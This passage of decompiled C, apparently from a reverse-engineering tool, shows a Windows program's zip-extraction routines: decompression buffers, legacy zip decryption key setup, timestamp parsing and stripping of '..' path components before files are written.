  _Memory = (void **)_malloc(0x84);
  if (_Memory != (void **)0x0) {
    pvVar2 = _malloc(0x4000);
    *_Memory = pvVar2;
    _Memory[0x11] = local_8;
    _Memory[0x12] = local_c;
    _Memory[0x13] = (void *)0x0;
    if (pvVar2 != (void *)0x0) {
      _Memory[0x10] = (void *)0x0;
      pvVar2 = unaff_EBX[0xd];
      _Memory[0x15] = unaff_EBX[0xf];
      _Memory[0x14] = (void *)0x0;
      _Memory[0x19] = unaff_EBX[0xd];
      _Memory[0x18] = *unaff_EBX;
      _Memory[0x1a] = unaff_EBX[3];
      _Memory[6] = (void *)0x0;
      if (pvVar2 != (void *)0x0) {
        _Memory[9] = (void *)0x0;
        _Memory[10] = (void *)0x0;
        _Memory[0xb] = (void *)0x0;
        iVar1 = FUN_0038c280();
        if (iVar1 == 0) {
          _Memory[0x10] = (void *)0x1;
        }
      }
      _Memory[0x16] = unaff_EBX[0x10];
      _Memory[0x17] = unaff_EBX[0x11];
      *(byte *)(_Memory + 0x1b) = *(byte *)(unaff_EBX + 0xc) & 1;
      if (((uint)unaff_EBX[0xc] >> 3 & 1) == 0) {
        *(undefined *)(_Memory + 0x20) = *(undefined *)((int)unaff_EBX + 0x3f);
      }
      else {
        *(undefined *)(_Memory + 0x20) = *(undefined *)((int)unaff_EBX + 0x39);
      }
      ppvVar3 = _Memory + 0x1c;
      _Memory[0x1f] = (void *)(-(uint)(*(char *)(_Memory + 0x1b) != '\0') & 0xc);
      *ppvVar3 = (void *)0x12345678;
      _Memory[0x1d] = (void *)0x23456789;
      _Memory[0x1e] = (void *)0x34567890;
      if (param_1 != (char *)0x0) {
        do {
          if (*param_1 == '\0') break;
          FUN_0038bfb0(*param_1,(uint *)ppvVar3);
          param_1 = param_1 + 1;
          ppvVar3 = extraout_EDX;
        } while (param_1 != (char *)0x0);
      }
      _Memory[0xf] = local_10 + (int)unaff_EBX[0x1e] + 0x1e;
      _Memory[2] = (void *)0x0;
      unaff_EBX[0x1f] = _Memory;
      return 0;
    }
    _free(_Memory);
  }
  return 0xffffff98;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

byte * __thiscall FUN_0038d610(void *this,int param_1,undefined *param_2)

{
  int *piVar1;
  char cVar2;
  int *piVar3;
  char *pcVar4;
  int iVar5;
  byte *pbVar6;
  undefined uVar7;
  int in_EAX;
  uint uVar8;
  uint uVar9;
  byte *local_c;
  byte *local_8;
  
  local_c = (byte *)0x0;
  local_8 = (byte *)0x0;
  if (param_2 != (undefined *)0x0) {
    *param_2 = 0;
  }
  if ((in_EAX == 0) || (piVar3 = *(int **)(in_EAX + 0x7c), piVar3 == (int *)0x0)) {
    return (byte *)0xffffff9a;
  }
  if (*piVar3 == 0) {
    return (byte *)0xffffff9c;
  }
  if (this == (void *)0x0) {
    return (byte *)0x0;
  }
  piVar3[4] = param_1;
  piVar3[5] = (int)this;
  if ((void *)piVar3[0x17] < this) {
    piVar3[5] = (int)(void *)piVar3[0x17];
  }
  if (piVar3[5] != 0) {
    do {
      if ((piVar3[2] == 0) && (uVar8 = piVar3[0x16], uVar8 != 0)) {
        uVar9 = 0x4000;
        if ((uVar8 < 0x4000) && (uVar9 = uVar8, uVar8 == 0)) {
          if (param_2 == (undefined *)0x0) {
            return (byte *)0x0;
          }
          *param_2 = 1;
          return (byte *)0x0;
        }
        pcVar4 = (char *)piVar3[0x18];
        if (*pcVar4 == '\0') {
          *(int *)(pcVar4 + 0x1c) = piVar3[0x1a] + piVar3[0xf];
        }
        else {
          if (pcVar4[1] == '\0') {
            return (byte *)0xffffffff;
          }
          (*_DAT_003d93d0)(*(undefined4 *)(pcVar4 + 4),
                           *(int *)(pcVar4 + 0xc) + piVar3[0x1a] + piVar3[0xf],0,0);
        }
        uVar8 = FUN_0038c6d0((undefined4 *)*piVar3,1);
        if (uVar8 != 1) {
          return (byte *)0xffffffff;
        }
        iVar5 = *piVar3;
        piVar3[0xf] = piVar3[0xf] + uVar9;
        piVar3[0x16] = piVar3[0x16] - uVar9;
        piVar3[1] = iVar5;
        piVar3[2] = uVar9;
        if ((*(char *)(piVar3 + 0x1b) != '\0') && (uVar8 = 0, uVar9 != 0)) {
          do {
            uVar7 = FUN_0038c000();
            *(undefined *)(uVar8 + iVar5) = uVar7;
            uVar8 = uVar8 + 1;
          } while (uVar8 < uVar9);
        }
      }
      uVar8 = piVar3[2];
      uVar9 = piVar3[0x1f];
      if (uVar8 < (uint)piVar3[0x1f]) {
        uVar9 = uVar8;
      }
      if (uVar9 != 0) {
        cVar2 = *(char *)(piVar3[1] + uVar9 + -1);
        piVar3[0x17] = piVar3[0x17] - uVar9;
        piVar1 = piVar3 + 0x1f;
        *piVar1 = *piVar1 - uVar9;
        piVar3[2] = uVar8 - uVar9;
        piVar3[1] = piVar3[1] + uVar9;
        if ((*piVar1 == 0) && (cVar2 != *(char *)(piVar3 + 0x20))) {
          return (byte *)0xffffff96;
        }
      }
      if (piVar3[0x19] == 0) {
        uVar8 = piVar3[2];
        if ((uint)piVar3[5] < (uint)piVar3[2]) {
          uVar8 = piVar3[5];
        }
        uVar9 = 0;
        if (uVar8 != 0) {
          do {
            *(undefined *)(uVar9 + piVar3[4]) = *(undefined *)(uVar9 + piVar3[1]);
            uVar9 = uVar9 + 1;
          } while (uVar9 < uVar8);
        }
        pbVar6 = (byte *)piVar3[4];
        uVar9 = FUN_0038beb0(pbVar6,uVar8);
        piVar3[0x17] = piVar3[0x17] - uVar8;
        piVar3[2] = piVar3[2] - uVar8;
        piVar3[5] = piVar3[5] - uVar8;
        piVar3[1] = piVar3[1] + uVar8;
        piVar3[6] = piVar3[6] + uVar8;
        local_8 = local_8 + uVar8;
        piVar3[0x14] = uVar9;
        piVar3[4] = (int)(pbVar6 + uVar8);
        if ((piVar3[0x17] == 0) && (param_2 != (undefined *)0x0)) {
          *param_2 = 1;
        }
      }
      else {
        pbVar6 = (byte *)piVar3[4];
        iVar5 = piVar3[6];
        local_c = FUN_0038c330();
        uVar9 = piVar3[6] - iVar5;
        uVar8 = FUN_0038beb0(pbVar6,uVar9);
        piVar3[0x17] = piVar3[0x17] - uVar9;
        local_8 = local_8 + uVar9;
        piVar3[0x14] = uVar8;
        if ((local_c == (byte *)0x1) || (piVar3[0x17] == 0)) {
          if (param_2 == (undefined *)0x0) {
            return local_8;
          }
          *param_2 = 1;
          return local_8;
        }
        if (local_c != (byte *)0x0) {
          return local_c;
        }
      }
    } while (piVar3[5] != 0);
    if (local_c != (byte *)0x0) {
      return local_c;
    }
  }
  return local_8;
}



undefined4 FUN_0038d870(void)

{
  void **_Memory;
  int unaff_EDI;
  undefined4 local_8;
  
  local_8 = 0;
  if (unaff_EDI == 0) {
    return 0xffffff9a;
  }
  _Memory = *(void ***)(unaff_EDI + 0x7c);
  if (_Memory == (void **)0x0) {
    return 0xffffff9a;
  }
  if ((_Memory[0x17] == (void *)0x0) && (_Memory[0x14] != _Memory[0x15])) {
    local_8 = 0xffffff97;
  }
  if (*_Memory != (void *)0x0) {
    _free(*_Memory);
    *_Memory = (void *)0x0;
  }
  *_Memory = (void *)0x0;
  if (_Memory[0x10] != (void *)0x0) {
    FUN_0038c230();
  }
  _Memory[0x10] = (void *)0x0;
  _free(_Memory);
  *(undefined4 *)(unaff_EDI + 0x7c) = 0;
  return local_8;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int FUN_0038d900(undefined4 param_1,undefined4 param_2)

{
  char cVar1;
  size_t sVar2;
  undefined2 *puVar3;
  undefined4 *puVar4;
  int *unaff_ESI;
  
  if ((*unaff_ESI == 0) && (unaff_ESI[1] == -1)) {
    (*_DAT_003d9398)(0x103,unaff_ESI + 0x50);
    sVar2 = _strlen((char *)(unaff_ESI + 0x50));
    cVar1 = *(char *)(sVar2 + 0x13f + (int)unaff_ESI);
    if ((cVar1 != '\\') && (cVar1 != '/')) {
      *(undefined2 *)((int)unaff_ESI + sVar2 + 0x140) = 0x2f;
    }
    puVar3 = (undefined2 *)FUN_003b103e(0x20);
    *puVar3 = 0x100;
    *(undefined *)(puVar3 + 8) = 0;
    *(undefined4 *)(puVar3 + 10) = param_1;
    *(undefined4 *)(puVar3 + 0xc) = param_2;
    *(undefined4 *)(puVar3 + 0xe) = 0;
    *(undefined4 *)(puVar3 + 6) = 0;
    puVar4 = FUN_0038cac0();
    *unaff_ESI = (int)puVar4;
    return (-(uint)(puVar4 != (undefined4 *)0x0) & 0xfffffe00) + 0x200;
  }
  return 0x1000000;
}



// WARNING: Could not reconcile some variable overlaps
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_0038d9a0(char **param_1,undefined4 *param_2,char *param_3)

{
  uchar uVar1;
  int3 iVar2;
  byte bVar3;
  int iVar4;
  undefined4 *puVar5;
  char *pcVar6;
  uchar *puVar7;
  int iVar8;
  uint uVar9;
  byte bVar10;
  byte bVar11;
  undefined4 *extraout_EDX;
  undefined4 *puVar12;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  char **extraout_EDX_02;
  char **ppcVar13;
  undefined4 extraout_EDX_03;
  uchar *_Str;
  ulonglong uVar14;
  undefined uVar15;
  undefined4 *puVar16;
  undefined in_stack_fffffd4c;
  uint local_2b0 [4];
  uint local_2a0;
  undefined4 local_298;
  undefined4 local_294;
  uint local_27c;
  undefined4 local_25c;
  char *local_258;
  undefined4 local_254;
  undefined4 local_250;
  undefined4 local_24c;
  char *local_248;
  char **local_244;
  undefined4 *local_240;
  char *local_23c;
  char *local_238;
  byte local_234;
  byte local_233;
  byte local_232;
  byte local_231;
  short local_230;
  ushort local_22e;
  ushort local_22a;
  ushort local_228;
  ushort local_226;
  short local_224;
  undefined2 local_222;
  uchar local_220 [264];
  undefined4 local_118 [67];
  uint local_c;
  
  local_c = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_244 = param_1;
  local_240 = param_2;
  if (((int)param_3 < -1) || (*(int *)(*param_1 + 4) <= (int)param_3)) {
    terminate_if_debugger_present(local_c ^ (uint)&stack0xfffffffc,param_2,in_stack_fffffd4c);
    return;
  }
  puVar12 = param_2;
  if (param_1[1] != (char *)0xffffffff) {
    FUN_0038d870();
    puVar12 = extraout_EDX;
  }
  param_1[1] = (char *)0xffffffff;
  if (param_3 == param_1[0x4d]) {
    if (param_3 != (char *)0xffffffff) {
      FUN_003aee70(param_2,param_1 + 2,300);
      terminate_if_debugger_present
                (local_c ^ (uint)&stack0xfffffffc,extraout_EDX_00,in_stack_fffffd4c);
      return;
    }
LAB_0038da2b:
    *param_2 = *(undefined4 *)(*param_1 + 4);
    *(undefined *)(param_2 + 1) = 0;
    param_2[0x42] = 0;
    param_2[0x43] = 0;
    param_2[0x44] = 0;
    param_2[0x45] = 0;
    param_2[0x46] = 0;
    param_2[0x47] = 0;
    param_2[0x48] = 0;
    param_2[0x49] = 0;
    param_2[0x4a] = 0;
    terminate_if_debugger_present(local_c ^ (uint)&stack0xfffffffc,puVar12,in_stack_fffffd4c);
    return;
  }
  if (param_3 == (char *)0xffffffff) goto LAB_0038da2b;
  if ((int)param_3 < *(int *)(*param_1 + 0x10)) {
    FUN_0038d060();
  }
  iVar4 = *(int *)(*param_1 + 0x10);
  while (iVar4 < (int)param_3) {
    pcVar6 = *param_1;
    if (((pcVar6 != (char *)0x0) && (*(int *)(pcVar6 + 0x18) != 0)) &&
       (*(int *)(pcVar6 + 0x10) + 1 != *(int *)(pcVar6 + 4))) {
      *(int *)(pcVar6 + 0x14) =
           *(int *)(pcVar6 + 0x14) +
           *(int *)(pcVar6 + 0x50) + *(int *)(pcVar6 + 0x4c) + 0x2e + *(int *)(pcVar6 + 0x48);
      *(int *)(pcVar6 + 0x10) = *(int *)(pcVar6 + 0x10) + 1;
      iVar4 = FUN_0038cc60((int *)(pcVar6 + 0x28),(uint *)(pcVar6 + 0x78),(undefined4 *)0x0,0);
      *(uint *)(pcVar6 + 0x18) = (uint)(iVar4 == 0);
    }
    iVar4 = *(int *)(*param_1 + 0x10);
  }
  FUN_0038cc60((int *)local_2b0,(uint *)0x0,local_118,0x104);
  iVar4 = FUN_0038d1f0(&local_248,&local_238,&local_23c);
  if (iVar4 != 0) {
    terminate_if_debugger_present
              (local_c ^ (uint)&stack0xfffffffc,extraout_EDX_01,in_stack_fffffd4c);
    return;
  }
  ppcVar13 = (char **)*param_1;
  pcVar6 = *ppcVar13;
  if (*pcVar6 == '\0') {
    *(char **)(pcVar6 + 0x1c) = local_238;
  }
  else {
    if (pcVar6[1] == '\0') goto LAB_0038dba4;
    (*_DAT_003d93d0)(*(undefined4 *)(pcVar6 + 4),local_238 + *(int *)(pcVar6 + 0xc),0,0);
  }
  pcVar6 = local_23c;
  puVar5 = (undefined4 *)FUN_003ae40b((size_t)local_23c);
  pcVar6 = (char *)FUN_0038c6d0(puVar5,(uint)pcVar6);
  puVar12 = local_240;
  if (pcVar6 == local_23c) {
    *local_240 = *(undefined4 *)(*local_244 + 0x10);
    _strcpy((char *)local_220,(char *)local_118);
    _Str = local_220;
    while( true ) {
      while( true ) {
        while( true ) {
          while( true ) {
            while( true ) {
              while( true ) {
                for (; (uVar1 = *_Str, uVar1 != '\0' && (_Str[1] == ':')); _Str = _Str + 2) {
                }
                if (uVar1 != '\\') break;
                _Str = _Str + 1;
              }
              if (uVar1 != '/') break;
              _Str = _Str + 1;
            }
            puVar7 = __mbsstr(_Str,"\\..\\");
            if (puVar7 == (uchar *)0x0) break;
            _Str = puVar7 + 4;
          }
          puVar7 = __mbsstr(_Str,"\\../");
          if (puVar7 == (uchar *)0x0) break;
          _Str = puVar7 + 4;
        }
        puVar7 = __mbsstr(_Str,"/../");
        if (puVar7 == (uchar *)0x0) break;
        _Str = puVar7 + 4;
      }
      puVar7 = __mbsstr(_Str,"/..\\");
      if (puVar7 == (uchar *)0x0) break;
      _Str = puVar7 + 4;
    }
    __mbsnbcpy((uchar *)(puVar12 + 1),_Str,0x104);
    local_231 = (byte)(local_27c >> 0x1e) & 1;
    bVar11 = ~(byte)(local_27c >> 0x17);
    local_2b0[0] = local_2b0[0] >> 8;
    local_233 = 0;
    local_234 = 0;
    local_232 = 1;
    if (((local_2b0[0] == 0) || (local_2b0[0] == 7)) ||
       ((local_2b0[0] == 0xb || (local_2b0[0] == 0xe)))) {
      local_233 = (byte)(local_27c >> 1) & 1;
      local_234 = (byte)(local_27c >> 2) & 1;
      bVar11 = (byte)local_27c;
      bVar3 = (byte)(local_27c >> 5) & 1;
      bVar10 = (byte)(local_27c >> 4) & 1;
    }
    else {
      bVar3 = 1;
      bVar10 = local_231;
    }
    puVar12[0x42] = 0;
    if (bVar10 != 0) {
      puVar12[0x42] = 0x10;
    }
    if (bVar3 != 0) {
      puVar12[0x42] = puVar12[0x42] | 0x20;
    }
    if (local_233 != 0) {
      puVar12[0x42] = puVar12[0x42] | 2;
    }
    if ((bVar11 & 1) != 0) {
      puVar12[0x42] = puVar12[0x42] | 1;
    }
    if (local_234 != 0) {
      puVar12[0x42] = puVar12[0x42] | 4;
    }
    puVar12[0x49] = local_298;
    puVar12[0x4a] = local_294;
    local_22a = (ushort)(local_2a0 >> 0x10);
    local_230 = (local_22a >> 9) + 0x7bc;
    local_22e = local_22a >> 5 & 0xf;
    local_22a = local_22a & 0x1f;
    local_228 = (ushort)local_2a0 >> 0xb;
    local_226 = (ushort)(local_2a0 >> 5) & 0x3f;
    local_224 = ((ushort)local_2a0 & 0x1f) * 2;
    puVar16 = &local_24c;
    local_222 = 0;
    (*_DAT_003d94c4)(&local_230);
    local_25c = local_24c;
    local_258 = local_248;
    (*_DAT_003d9530)(&local_25c,&local_254);
    uVar15 = SUB41(puVar16,0);
    iVar4 = 0;
    puVar12[0x43] = local_254;
    puVar12[0x44] = local_250;
    puVar12[0x45] = local_254;
    puVar12[0x46] = local_250;
    puVar12[0x47] = local_254;
    puVar12[0x48] = local_250;
    if (&DAT_00000004 < local_23c) {
      do {
        local_240 = (undefined4 *)(uint)*(byte *)(iVar4 + 2 + (int)puVar5);
        local_238._0_2_ =
             CONCAT11(*(undefined *)(iVar4 + 1 + (int)puVar5),*(undefined *)(iVar4 + (int)puVar5));
        local_238 = (char *)((uint)local_238 & 0xff000000 | (uint)(ushort)local_238);
        iVar8 = _strcmp((char *)&local_238,"UT");
        uVar15 = SUB41(puVar16,0);
        if (iVar8 == 0) {
          bVar11 = *(byte *)(iVar4 + 4 + (int)puVar5);
          local_231 = bVar11 >> 1 & 1;
          local_232 = bVar11 >> 2 & 1;
          iVar8 = iVar4 + 5;
          if ((bVar11 & 1) != 0) {
            iVar2 = CONCAT21(CONCAT11(*(undefined *)(iVar4 + 8 + (int)puVar5),
                                      *(undefined *)(iVar4 + 7 + (int)puVar5)),
                             *(undefined *)(iVar4 + 6 + (int)puVar5));
            uVar9 = CONCAT31(iVar2,*(undefined *)(iVar8 + (int)puVar5));
            iVar8 = iVar4 + 9;
            uVar14 = __allmul(uVar9 + 0xb6109100,
                              ((int)iVar2 >> 0x17) + 2 + (uint)(0x49ef6eff < uVar9),10000000,0);
            puVar12[0x47] = (int)uVar14;
            puVar12[0x48] = (int)(uVar14 >> 0x20);
          }
          if (local_231 != 0) {
            iVar2 = CONCAT21(CONCAT11(*(undefined *)(iVar8 + 3 + (int)puVar5),
                                      *(undefined *)(iVar8 + 2 + (int)puVar5)),
                             *(undefined *)(iVar8 + 1 + (int)puVar5));
            uVar9 = CONCAT31(iVar2,*(undefined *)(iVar8 + (int)puVar5));
            iVar8 = iVar8 + 4;
            uVar14 = __allmul(uVar9 + 0xb6109100,
                              ((int)iVar2 >> 0x17) + 2 + (uint)(0x49ef6eff < uVar9),10000000,0);
            puVar12[0x43] = (int)uVar14;
            puVar12[0x44] = (int)(uVar14 >> 0x20);
          }
          if (local_232 != 0) {
            iVar2 = CONCAT21(CONCAT11(*(undefined *)(iVar8 + 3 + (int)puVar5),
                                      *(undefined *)(iVar8 + 2 + (int)puVar5)),
                             *(undefined *)(iVar8 + 1 + (int)puVar5));
            uVar9 = CONCAT31(iVar2,*(undefined *)(iVar8 + (int)puVar5));
            uVar14 = __allmul(uVar9 + 0xb6109100,
                              ((int)iVar2 >> 0x17) + 2 + (uint)(0x49ef6eff < uVar9),10000000,0);
            puVar12[0x45] = (int)uVar14;
            puVar12[0x46] = (int)(uVar14 >> 0x20);
          }
          break;
        }
        iVar4 = iVar4 + 4 + (int)local_240;
      } while ((char *)(iVar4 + 4) < local_23c);
    }
    if (puVar5 != (undefined4 *)0x0) {
      FUN_003b14b9(puVar5);
    }
    ppcVar13 = local_244;
    FUN_003aee70(local_244 + 2,puVar12,300);
    ppcVar13[0x4d] = param_3;
    terminate_if_debugger_present(local_c ^ (uint)&stack0xfffffffc,extraout_EDX_03,uVar15);
    return;
  }
  FUN_003b14b9(puVar5);
  ppcVar13 = extraout_EDX_02;
LAB_0038dba4:
  terminate_if_debugger_present(local_c ^ (uint)&stack0xfffffffc,ppcVar13,in_stack_fffffd4c);
  return;
}



void __fastcall FUN_0038e030(char **param_1,undefined (*param_2) [16],char **param_3,char *param_4)

{
  char *pcVar1;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar2;
  undefined8 uVar3;
  undefined in_stack_fffffee0;
  char local_114 [268];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  _strcpy(local_114,param_4);
  uVar3 = FUN_0038d0a0((int)*param_3,extraout_EDX);
  uVar2 = (undefined4)((ulonglong)uVar3 >> 0x20);
  if ((int)uVar3 == 0) {
    if (param_3[1] != (char *)0xffffffff) {
      FUN_0038d870();
    }
    param_3[1] = (char *)0xffffffff;
    pcVar1 = *(char **)(*param_3 + 0x10);
    if (param_1 != (char **)0x0) {
      *param_1 = pcVar1;
    }
    if (param_2 != (undefined (*) [16])0x0) {
      uVar3 = FUN_0038d9a0(param_3,(undefined4 *)param_2,pcVar1);
      param_2 = (undefined (*) [16])((ulonglong)uVar3 >> 0x20);
    }
    terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,param_2,in_stack_fffffee0);
    return;
  }
  if (param_1 != (char **)0x0) {
    *param_1 = (char *)0xffffffff;
  }
  if (param_2 != (undefined (*) [16])0x0) {
    trim_string(param_2,0,300);
    *(undefined4 *)*param_2 = 0xffffffff;
    uVar2 = extraout_EDX_00;
  }
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar2,in_stack_fffffee0);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall
FUN_0038e120(char **param_1,undefined4 param_2,char *param_3,uchar *param_4,void *param_5,
            int param_6)

{
  uchar *puVar1;
  uchar uVar2;
  int iVar3;
  char *pcVar4;
  byte *pbVar5;
  uchar *puVar6;
  undefined4 extraout_EDX;
  uint extraout_EDX_00;
  uint extraout_EDX_01;
  undefined4 extraout_EDX_02;
  uint uVar7;
  undefined4 extraout_EDX_03;
  undefined4 extraout_EDX_04;
  undefined4 extraout_EDX_05;
  undefined4 uVar8;
  uchar *puVar9;
  undefined8 uVar10;
  undefined uVar11;
  char **ppcVar12;
  char **ppcVar13;
  int local_354;
  char local_34d;
  undefined4 local_34c [66];
  uint local_244;
  undefined local_240 [8];
  undefined local_238 [8];
  undefined local_230 [20];
  undefined local_21c [264];
  uchar local_114 [268];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  ppcVar12 = param_1;
  if (param_6 == 3) {
    if (param_3 != param_1[1]) {
      if (param_1[1] != (char *)0xffffffff) {
        FUN_0038d870();
        param_2 = extraout_EDX;
      }
      param_1[1] = (char *)0xffffffff;
      if (*(int *)(*param_1 + 4) <= (int)param_3) goto LAB_0038e161;
      if ((int)param_3 < *(int *)(*param_1 + 0x10)) {
        FUN_0038d060();
      }
      iVar3 = *(int *)(*param_1 + 0x10);
      while (iVar3 < (int)param_3) {
        pcVar4 = *param_1;
        if (((pcVar4 != (char *)0x0) && (*(int *)(pcVar4 + 0x18) != 0)) &&
           (*(int *)(pcVar4 + 0x10) + 1 != *(int *)(pcVar4 + 4))) {
          *(int *)(pcVar4 + 0x10) = *(int *)(pcVar4 + 0x10) + 1;
          *(int *)(pcVar4 + 0x14) =
               *(int *)(pcVar4 + 0x14) +
               *(int *)(pcVar4 + 0x50) + *(int *)(pcVar4 + 0x4c) + 0x2e + *(int *)(pcVar4 + 0x48);
          iVar3 = FUN_0038cc60((int *)(pcVar4 + 0x28),(uint *)(pcVar4 + 0x78),(undefined4 *)0x0,0);
          *(uint *)(pcVar4 + 0x18) = (uint)(iVar3 == 0);
        }
        iVar3 = *(int *)(*param_1 + 0x10);
      }
      FUN_0038d4a0(param_1[0x4e]);
      ppcVar12[1] = param_3;
    }
    ppcVar13 = ppcVar12;
    pbVar5 = FUN_0038d610(param_5,(int)param_4,&local_34d);
    uVar7 = extraout_EDX_00;
    if ((int)pbVar5 < 1) {
      FUN_0038d870();
      ppcVar12[1] = (char *)0xffffffff;
      uVar7 = extraout_EDX_01;
    }
    if (local_34d == '\0') {
      if ((int)pbVar5 < 1) {
        terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar7,(char)ppcVar13);
        return;
      }
      terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar7,(char)ppcVar13);
      return;
    }
LAB_0038e25e:
    terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar7,(char)ppcVar13);
    return;
  }
  if ((param_6 != 2) && (param_6 != 1)) {
LAB_0038e161:
    terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,param_2,(char)ppcVar12);
    return;
  }
  if (param_1[1] != (char *)0xffffffff) {
    FUN_0038d870();
    param_2 = extraout_EDX_02;
  }
  param_1[1] = (char *)0xffffffff;
  if (*(int *)(*param_1 + 4) <= (int)param_3) goto LAB_0038e161;
  if ((int)param_3 < *(int *)(*param_1 + 0x10)) {
    FUN_0038d060();
  }
  iVar3 = *(int *)(*param_1 + 0x10);
  ppcVar13 = ppcVar12;
  while (iVar3 < (int)param_3) {
    pcVar4 = *param_1;
    if (((pcVar4 != (char *)0x0) && (*(int *)(pcVar4 + 0x18) != 0)) &&
       (*(int *)(pcVar4 + 0x10) + 1 != *(int *)(pcVar4 + 4))) {
      *(int *)(pcVar4 + 0x14) =
           *(int *)(pcVar4 + 0x14) +
           *(int *)(pcVar4 + 0x50) + *(int *)(pcVar4 + 0x4c) + 0x2e + *(int *)(pcVar4 + 0x48);
      *(int *)(pcVar4 + 0x10) = *(int *)(pcVar4 + 0x10) + 1;
      iVar3 = FUN_0038cc60((int *)(pcVar4 + 0x28),(uint *)(pcVar4 + 0x78),(undefined4 *)0x0,0);
      *(uint *)(pcVar4 + 0x18) = (uint)(iVar3 == 0);
    }
    iVar3 = *(int *)(*param_1 + 0x10);
  }
  FUN_0038d9a0(param_1,local_34c,param_3);
  uVar7 = local_244 >> 4;
  if ((uVar7 & 1) != 0) goto LAB_0038e25e;
  local_21c[0] = 0;
  if (param_6 == 1) goto LAB_0038e401;
  uVar2 = *param_4;
  puVar6 = param_4;
  puVar9 = param_4;
  while (uVar2 != '\0') {
    if ((uVar2 == '/') || (uVar2 == '\\')) {
      puVar9 = puVar6 + 1;
    }
    puVar1 = puVar6 + 1;
    puVar6 = puVar6 + 1;
    uVar2 = *puVar1;
  }
  __mbsnbcpy(local_114,param_4,0x104);
  if (puVar9 == param_4) {
    local_114[0] = '\0';
LAB_0038e3ba:
    (*_DAT_003d9374)(local_21c,"%s%s%s",param_1 + 0x50,local_114,puVar9);
  }
  else {
    puVar9[(int)(local_114 + -(int)param_4)] = '\0';
    if (((local_114[0] != '/') && (local_114[0] != '\\')) &&
       ((local_114[0] == '\0' || (local_114[1] != ':')))) goto LAB_0038e3ba;
    (*_DAT_003d9374)(local_21c,&DAT_003d0954,local_114,puVar9);
  }
  uVar10 = (*_DAT_003d93b4)(local_21c,0x40000000,0,0,2,local_244,0);
  uVar7 = (uint)((ulonglong)uVar10 >> 0x20);
  param_4 = (uchar *)uVar10;
LAB_0038e401:
  if (param_4 == (uchar *)0xffffffff) {
    terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar7,(char)ppcVar13);
    return;
  }
  FUN_0038d4a0(param_1[0x4e]);
  ppcVar12 = ppcVar13;
  if (ppcVar13[0x4f] == (char *)0x0) {
    pcVar4 = (char *)FUN_003ae40b(0x4000);
    ppcVar13[0x4f] = pcVar4;
  }
  local_354 = 0;
  do {
    pbVar5 = FUN_0038d610((void *)0x4000,(int)ppcVar13[0x4f],&local_34d);
    uVar11 = SUB41(ppcVar12,0);
    if (pbVar5 == (byte *)0xffffff96) {
      local_354 = 0x1000;
      goto LAB_0038e511;
    }
    if ((int)pbVar5 < 0) break;
    if (0 < (int)pbVar5) {
      iVar3 = (*_DAT_003d9420)(param_4,ppcVar13[0x4f],pbVar5,&stack0xfffffca8,0);
      uVar11 = SUB41(ppcVar12,0);
      if (iVar3 == 0) {
        local_354 = 0x400;
        goto LAB_0038e511;
      }
    }
    uVar11 = SUB41(ppcVar12,0);
    if (local_34d != '\0') goto LAB_0038e511;
  } while (pbVar5 != (byte *)0x0);
  local_354 = 0x5000000;
LAB_0038e511:
  FUN_0038d870();
  uVar8 = extraout_EDX_03;
  if (local_354 == 0) {
    (*_DAT_003d955c)(param_4,local_238,local_240,local_230);
    uVar8 = extraout_EDX_04;
  }
  if (param_6 != 1) {
    (*_DAT_003d93b8)(param_4);
    uVar8 = extraout_EDX_05;
  }
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar8,uVar11);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0038e580(void)

{
  void **_Memory;
  void *pvVar1;
  void **unaff_ESI;
  
  if (unaff_ESI[1] != (void *)0xffffffff) {
    FUN_0038d870();
  }
  _Memory = (void **)*unaff_ESI;
  unaff_ESI[1] = (void *)0xffffffff;
  if (_Memory != (void **)0x0) {
    if (_Memory[0x1f] != (void *)0x0) {
      FUN_0038d870();
    }
    pvVar1 = *_Memory;
    if (pvVar1 != (void *)0x0) {
      if (*(char *)((int)pvVar1 + 0x10) != '\0') {
        (*_DAT_003d93b8)(*(undefined4 *)((int)pvVar1 + 4));
      }
      FUN_003aee4b(pvVar1);
    }
    _free(_Memory);
  }
  *unaff_ESI = (void *)0x0;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 * __cdecl FUN_0038e5e0(undefined4 param_1,undefined4 param_2)

{
  undefined4 *puVar1;
  size_t sVar2;
  char *_Dest;
  undefined4 *puVar3;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c3c5b;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  puVar1 = (undefined4 *)FUN_003b103e(0x244);
  local_8 = 0;
  if (puVar1 == (undefined4 *)0x0) {
    puVar1 = (undefined4 *)0x0;
  }
  else {
    *puVar1 = 0;
    puVar1[1] = 0xffffffff;
    puVar1[0x4d] = 0xffffffff;
    puVar1[0x4e] = 0;
    puVar1[0x4f] = 0;
    sVar2 = _strlen("");
    _Dest = (char *)FUN_003ae40b(sVar2 + 1);
    puVar1[0x4e] = _Dest;
    _strcpy(_Dest,"");
  }
  local_8 = 0xffffffff;
  _DAT_003d96b0 = FUN_0038d900(param_1,param_2);
  if (_DAT_003d96b0 != 0) {
    if (puVar1 != (undefined4 *)0x0) {
      FUN_0038e6e0();
    }
    *in_FS_OFFSET = local_10;
    return (undefined4 *)0x0;
  }
  puVar3 = (undefined4 *)FUN_003b103e(8);
